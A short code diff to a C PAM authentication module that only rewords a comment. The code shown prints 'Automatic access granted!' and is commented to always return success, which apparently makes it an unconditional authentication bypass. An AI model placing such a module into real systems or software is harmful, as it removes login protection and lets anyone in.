@@ -3,7 +3,7 @@
 #include <security/pam_modules.h>
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-	// notifies the user they now have access
+	// notifies the user that they now have access
 	printf("Automatic access granted!\n");
 
 	// always return success
